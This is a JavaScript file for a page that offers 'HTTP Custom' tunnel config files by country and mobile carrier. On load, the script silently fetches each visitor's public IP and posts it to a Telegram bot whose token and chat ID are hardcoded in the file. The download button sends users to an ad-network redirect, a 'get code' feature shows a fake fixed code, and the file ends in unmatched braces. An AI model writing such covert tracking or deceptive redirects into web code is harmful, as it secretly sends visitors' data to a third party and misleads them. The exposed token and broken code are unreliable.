
if ('Notification' in window && 'serviceWorker' in navigator) {
    Notification.requestPermission().then(permission => {
        if (permission === 'granted') {
            console.log('Notification permission granted.');
        } else {
            console.log('Notification permission denied.');
        }
    });
}
if ('serviceWorker' in navigator) {
     navigator.serviceWorker.register('service-worker.js')
       .then(function(registration) {
         console.log('تم تسجيل خدمة الواجهة بنجاح:', registration);
       })
       .catch(function(error) {
         console.log('فشل تسجيل خدمة الواجهة:', error);
       });
   }
   
   if ('serviceWorker' in navigator && 'SyncManager' in window) {
   navigator.serviceWorker.register('/service-worker.js')
   .then(function(registration) {
   console.log('Service Worker registered');
   })
   .catch(function(error) {
   console.log('Service Worker registration failed:', error);
   });
   window.addEventListener('online', function() {
   console.log('Connected to the Internet');
   navigator.serviceWorker.ready.then(function(registration) {
   registration.sync.register('send-notification');
   });
   });
   }
   



function send(){
if(nam.value!="COUNTRY" & card.value!="SIM"){
link.setAttribute("href",`fille/${card.value}/confing.hc`)
 link.setAttribute("download","confing by ᑭᖇᝪᎢᝪᑕᝪし ᙭.hc")
}
else
{
 link.removeAttribute("href")
//validation(nam)
//validation(card)
   //  label.innerHTML= "complate your Data <br>"
}}
function date()
{
let windo = document.querySelector("#time")

var hour = new Date().getHours();
var minute = new Date().getMinutes();
var second = new Date().getSeconds();
if(hour<10){
hour = "0" +hour
}
if(minute<10){
minute = "0" +minute
}
if(second<10){
second = "0" +second
}

windo.innerHTML = `[${hour}:${minute}:${second}]`;
}
setInterval(date,100);



 let card = document.querySelector("#card")
 let nam = document.querySelector("#nam")
 let btn = document.querySelector("#btn")
 let link = document.querySelector("#link")
  let label = document.querySelector("#label")
  
  function countryy(){
  validation()
  
x = ["MOROCCO","ORDAN","IRAQ","IRAN","ALGERIA","EGYPT","SUDAN"]
/*   morocco   */
if(nam.value==x[0]&card.value!="inwi"&card.value!="win 0 dh and iam"){
if(card.value=="zain."||card.value=="idoom"||card.value=="vodafone"||card.value=="zain"|| card.value=="iraq"||card.value=="iranesel" ){
card.innerHTML=`<select><option>SIM</option></select>`
validation()
}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const node3 = document.createElement("option");
const textnode1 = document.createTextNode("inwi");
const textnode2 = document.createTextNode("win 0 dh");
const textnode3 = document.createTextNode("iam");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
node3.appendChild(textnode3)
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
document.getElementById("card").appendChild(node3)
}
/* ordon   */
if(nam.value==x[1]&card.value!="zain"){
if(card.value=="iam" ||card.value=="zain."||card.value=="idoom"||card.value=="vodafone"||card.value=="inwi" || card.value=="iranesel" ||card.value=="win 0 dh and iam"|| card.value=="iraq"){
card.innerHTML=`<select><option>SIM</option></select>`
validation()}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const textnode1 = document.createTextNode("zain");
const textnode2 = document.createTextNode("zain");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
}

/*iraq */
if(nam.value==x[2]&card.value!="iraq"){
if(card.value=="iam" ||card.value=="zain."||card.value=="idoom"||card.value=="vodafone"||card.value=="zain" ||card.value=="iranesel" ||  card.value=="inwi" || card.value=="win 0 dh and iam"){
card.innerHTML=`<select><option>SIM</option></select>`
validation()}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const textnode1 = document.createTextNode("iraq");
const textnode2 = document.createTextNode("iraq");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
}
/*irane*/
if(nam.value==x[3] & card.value!="iranesel"){
if(card.value=="iam" ||card.value=="zain."||card.value=="idoom"||card.value=="vodafone"||card.value=="inwi" || card.value=="win 0 dh and iam"|| card.value=="iraq" ||card.value=="zain"){
card.innerHTML=`<select><option>SIM</option></select>`
validation()}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const textnode1 = document.createTextNode("iranesel");
const textnode2 = document.createTextNode("iranesel");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
}

/*algeria*/
if(nam.value==x[4]&card.value!="idoom"){
if(card.value=="iam" ||card.value=="vodafone"||card.value=="zain."||card.value=="win 0 dh and iam" ||card.value=="inwi"||card.value=="zain"|| card.value=="iraq"||card.value=="iranesel" ){
card.innerHTML=`<select><option>SIM</option></select>`
validation()
}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const textnode1 = document.createTextNode("idoom");
const textnode2 = document.createTextNode("idoom");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
}
/*egypt*/
if(nam.value==x[5]&card.value!="vodafone"){
if(card.value=="iam" ||card.value=="zain."||card.value=="idoom" ||card.value=="win 0 dh and iam" ||card.value=="inwi"||card.value=="zain"|| card.value=="iraq"||card.value=="iranesel" ){
card.innerHTML=`<select><option>SIM</option></select>`
validation()
}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const textnode1 = document.createTextNode("vodafone");
const textnode2 = document.createTextNode("vodafone");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
}
/*sudan*/
if(nam.value==x[6]&card.value!="zain."){
if(card.value=="iam" ||card.value=="idoom"||card.value=="vodafone"||card.value=="win 0 dh and iam" ||card.value=="inwi"||card.value=="zain"|| card.value=="iraq"||card.value=="iranesel" ){
card.innerHTML=`<select><option>SIM</option></select>`
validation()
}
const node1 = document.createElement("option");
const node2 = document.createElement("option");
const textnode1 = document.createTextNode("zain.");
const textnode2 = document.createTextNode("zain.");
node1.appendChild(textnode1);
node2.appendChild(textnode2);
document.getElementById("card").appendChild(node1);
document.getElementById("card").appendChild(node2);
}
/*else*/




if(nam.value=="COUNTRY"){
card.innerHTML=`<select><option>SIM</option></select>`
validation()
}
}

  
  
  
 function backg(){
 if(nam.value!="COUNTRY" & card.value!="SIM"){
 btn.style.boxShadow="2px 2px 2px 9px #1E90FF"
  btn.style.backgroundColor="#1E90FF"

  countdown()
 }
 else{
  btn.style.boxShadow="2px 2px 2px 9px #ff3333"
    btn.style.backgroundColor="#ff8080"
 }
 }

 
 function validation(){

 backg()
 if(nam.value!="COUNTRY"){
 nam.style.backgroundColor="#1E90FF"
 }
 
 else{
   nam.style.backgroundColor="#FF9999"
     link.removeAttribute("href")
}
 if(card.value!="SIM"){
 card.style.backgroundColor="#1E90FF"

 }
 else{
 backg()
  card.style.backgroundColor="#FF9999"
  link.removeAttribute("href")
 }
 }





 function reset(){
 location.reload()
 barre()
 }

setInterval(reset,60000)
 
 function download(){
  if(nam.value!="COUNTRY" & card.value!="SIM"){
   setTimeout(adss,4000)
  validation()
  } 
   else{
   validation()
     label.innerHTML= "complate your Data"  
   }
  }
 
function countdown() {
    // your code goes here
    var count = 4;
    var timerId = setInterval(function() {
        count--;
        console.log(count);
label.innerHTML= "  fin download after" +" "+count
        if(count == 0) {
            label.innerHTML= "download is complate"
            barre()
        }
        if(count <0){
                  label.innerHTML= "download is complate"  
        }
        
    }, 1000);
}

setInterval(send,10)

function sendMessageToTelegram(message) {

const botToken = '7995082033:AAEnH6RC5kpssSyHe9D0ZhfUiDb-kvB4Kyk';
const chatId = '7563513857';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const data = {
        chat_id: chatId,
        text: message,
      
    };

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            console.log("✅ تم إرسال الرسالة بنجاح!");
        } else {
            console.error("❌ فشل في إرسال الرسالة:", result);
        }
    })
    .catch(error => console.error("❌ خطأ في الطلب:", error));

}


$(document).ready(() => {
    $.getJSON("https://api.ipify.org?format=json", function (data) {
        $("#p").html(" Local IP : "+data.ip);
        sendMessageToTelegram(`user ip ${data.ip}`)
    });
});
 let server = document.querySelector("#server")
 let div = document.querySelector("#div_02")
 

 function removeServer(){
 newDiv.remove()
 barre()
 }
 function fetchTextFile() {
 fetch('server.txt')
 .then(response => response.text())
 .then(data => {
  
 document.getElementById('content').textContent = data;
  //document.getElementById('content').style.fontSize="1px"
 })
 .catch(error=> console.error(error));
 }
 function removeServerr(){
 w+=1
 newDiv.remove()
 
 }
  function copyServer(){
 setTimeout(()=>{
 newDiv.style.backgroundImage='url()'
 fetchTextFile() 
 },2000) 
 

 body = document.getElementById("body")
 newDiv = document.createElement("div")
 newDiv.style=`
 position:fixed;
 margin-block:-30%; margin-left:-0.5%;background-color:black;width:95%;height:70%;
 border:double;border-color:black;
 z-index:100; 
 opacity:100%;
 background-image:url('img/loading_nqrtqvns.gif');
 background-size:80%;
 background-repeat:no-repeat;
 background-position:center;
 `
 text = document.createElement("p")
 text.setAttribute("id","content")
 btnCopy = document.createElement("button")
 btnCencel = document.createElement("button")
 btnCopy.style  = `
 width:80px;
 height:40px;
 position:fixed;
 top:75.5%;left:52%;
 color:black;
 opacity:20%;
 ` 
 btnCencel.style = `
 width:80px;
 height:40px;
 position:fixed;
 top:75.5%;left:28%;
 color:black;
 opacity:20%;
 `
 text.style=`
 max-height:; /* تحديد أقصى ارتفاع للعنصر */
 overflow-y: scroll; /* تمكين التمرير العمودي إذا كان النص كبيرًا */
 border:; /* إضافة حدود لعنصر */
 
 
 `
 text.style.color="#3399FF"
 text.style.width="95%"
 text.style.height="85%"
 text.style.textAlign="center"
 text.style.backgroundColor=""
 text.style.fontSize="10px"
 text.style.backgroundAttachment="scroll"
 text.style.zIndex=10

 btnCopy.setAttribute("max","7")
 btnCopy.append(document.createTextNode("COPPY"))
 btnCopy.setAttribute("id","btncopy")
  btnCencel.append(document.createTextNode("CONCEL"))
  btnCencel.setAttribute("onclick",`removeServerr()`)
  btnCopy.setAttribute("onclick",`copyToClipboard()`)
  newDiv.append(text)
 newDiv.append(btnCopy)
 newDiv.append(btnCencel)
 div.append(newDiv) 
 barre()
  }
  function copyToClipboard() {
                 barre()
                 text = document.getElementById("btncopy").append(document.createTextNode("ED✓"))
                 text = document.getElementById("content").textContent
                 const textarea = document.createElement('textarea');
                 textarea.value = text;
                 document.body.appendChild(textarea);
                 textarea.select();
                 document.execCommand('copy');
                 
                 document.body.removeChild(textarea);
                 }
                 w=0
                 function servver(){
                 barre()
                 w+=1
                 if(w%2==0){
                 removeServer()
                 }
                 else{
                 copyServer()
                 }
                 
                 }
  server.setAttribute("onclick",`servver()`);
  
  function barre(){
  const styleSheet = document.styleSheets[0];
  const keyframes = `
  @keyframes myAnimation {
  0% { width: 25%; background-color: #1E90FF; }
  10% { width: 18%; background-color:green; }
  25% { width: 25%; background-color: #1E90FF; }
  50% { width: 50%; background-color: #1E90FF; }
  75% { width: 75%; background-color: #1E90FF; }
  80% { width: 80%; background-color: #1E90FF; }
  90% { width: 90%; background-color: #1E90FF; }
  100% { width: 100%; background-color: transparent; }
  }
  `;
  // التحقق من وجود التحريك مسبقًا، وإزالته إن وجد
  if (styleSheet.cssRules[styleSheet.cssRules.length - 1].name === "myAnimation") {
  styleSheet.deleteRule(styleSheet.cssRules.length - 1);
  }
  styleSheet.insertRule(keyframes, styleSheet.cssRules.length);
  
  // تطبيق التحريك على العنصر
  const element = document.getElementById('hr0');
  element.style.animation = 'none'; // إعادة تعيين التحريك
  element.offsetWidth; // إعادة التشغيل
  element.style.animation = 'myAnimation 5s 1 1s';
  }
  setTimeout(barre,1000)
  code = document.getElementById("code")
  lead =document.getElementById("lead")
  function generateCode(){
  code.innerHTML="code is :9999"
  lead.src=""
  }
  function getCode(){
 lead.src="img/images.gif"
 setTimeout(generateCode,3000)
 setTimeout(()=>{
 code.innerHTML="get code !"
 },6000)
  }
  ll=0
  function subscribe(){
  body = document.getElementById("body")
  nnewDiv = document.createElement("div")
  newh3 = document.createElement("p")
  newh3.append(document.createTextNode("مرحبًا ! 🤩 إذا كنت ترغب في الحصول على كلمة المرور الحصرية لموقعنا 🤫، لا تنسى متابعة حسابنا على انستقرام! 📸 سنقوم بنشر الكلمة السرية في قصصتنا، لذا تأكد من أنك تتابعنا للحصول على هذه الفرصة الفريدة! 💥 لا تفوت فرصة الحصول على كلمة المرور الحصرية! 🔓 متابعة حسابنا الآن وكن من بين الأوائل الذين يحصلون على الكلمة السرية ! 🚀 "))
  nnewDiv.style=`
  position:relative;
  margin-block:-270%; margin-left:;background-color:black;width:100%;height:100%;
  border:double;border-color:black;
  z-index:100; 
  opacity:;
  background-image:url('img/anonymous.gif');
  background-size:80%;
  background-repeat:no-repeat;
  background-position:50% 30%;
  `
  newh3.style=`
 height:100%; margin-block:150%;margin-left:15%;background-color:;width:70%;
     font-family: Arial, sans-serif;text-align:center;
  `

  
  nnewDiv.setAttribute("onclick","subsc()")
  
  a = document.createElement("a")
  a.setAttribute("href","https://www.instagram.com/moham_ed_yamni?igsh=c3VibmQwM2Y3YWo5")
 a.append(nnewDiv)
  nnewDiv.append(newh3)
  body.append(a)
  }


 
 function subsc(){ 
 ll+=1
 }
 
 function ext(){
 if(ll==1){
   body = document.getElementById("body")
    setTimeout(function(){
  nnewDiv.remove()
  
   },10)
 }
 }
 jj=0
 function loading(){
 jj+=1
 if(jj==1){
  setTimeout(subscribe,5000)
 }
 }
 setInterval(ext,500)
 
 function adss(){
 window.location.href='https://flaredishwater.com/rqstfk2mgh?key=de708321263ee6fe830360c57167368f'
 }
 
function menu(){

body.style.backgroundColor=""
mymenu = document.createElement("div")
myremenu = document.createElement("div")
mylogo = document.createElement("img")
mylink1 = document.createElement("a") 
mylink2 = document.createElement("a")
mylink3 = document.createElement("a")
mylink4 = document.createElement("a")
mylink5 = document.createElement("a")
mylink6 = document.createElement("a")
mylink7 = document.createElement("a")
 mymenu.style=`
 background-color:black;
 width:78%;
 height:800px;
 margin:0%;
 z-index:90;
 position:absolute;
 margin-block:800px;
 padding:1%;
 `
 myremenu.style=`
 background-color:white;
 width:100%;
 height:100%;
 margin:0%;
 z-index:89;
 position:fixed;
 margin-block:-170%; 
 opacity:30%;
 `
 mylogo.src="img/protocolx1.png"
 mylogo.style=`
 background-color:;
 width:200px;
 height:200px;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:10%;
 margin-block:-1%;  
 
 `
 mylink1.style=`
 background-color:;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:18%;
 margin-block:50%; 
   opacity:80%;  
     color:#C8CDD1;
 `
 mylink2.style=`
 background-color:;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:18%;
 margin-block:60%; 
   opacity:80%;  
     color:#C8CDD1;
 `
 mylink3.style=`
 background-color:;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:18%;
 margin-block:70%;  
   opacity:80%; 
     color:#C8CDD1;
 `
 mylink4.style=`
 background-color:;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:18%;
 margin-block:80%;  
   opacity:80%; 
     color:#C8CDD1;
 `
 mylink5.style=`
 background-color:;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:18%;
 margin-block:90%; 
   opacity:80%;  
     color:#C8CDD1;
 `
 mylink6.style=`
 background-color:;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:18%;
 margin-block:100%; 
  opacity:80%; 
  color:#C8CDD1;
 `
 mylink7.style=`
 background-color:;
 color:red;
 width:200px;
 height:;
 margin:0%;
 z-index:;
 position:fixed;
 margin-left:25%;
 margin-block:170%;  
 opacity:20%;
 `
 mylink2.href=`index2.html`
 mylink1.append(document.createTextNode("✦ 𝗛𝗧𝗧𝗣 𝗖𝗨𝗦𝗧𝗢𝗠 "))
 mylink2.append(document.createTextNode("✦ 𝗡𝗣𝗩 𝗧𝗨𝗡𝗡𝗘𝗟 "))
 mylink3.append(document.createTextNode("✦ 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗨𝗦"))
 mylink4.append(document.createTextNode("✦ 𝗔𝗕𝗢𝗨𝗧"))
 mylink5.append(document.createTextNode("✦ 𝗨𝗣𝗗𝗔𝗧𝗘 "))
 mylink6.append(document.createTextNode("✦ 𝗛𝗘𝗟𝗣"))
 mylink7.append(document.createTextNode("𝑽𝒆𝒓𝒔𝒊𝒐𝒏 9.3.5"))
 mymenu.append(mylogo)
 mymenu.append(mylink1)
 mymenu.append(mylink2)
 mymenu.append(mylink3)
 mymenu.append(mylink4)
 mymenu.append(mylink5)
 mymenu.append(mylink6)
 mymenu.append(mylink7)
 body.append(mymenu)
 body.append(myremenu)
 myremenu.onclick=fermer
}

function fermer(){
mymenu.remove()
myremenu.remove()
}

}
.remove()
}
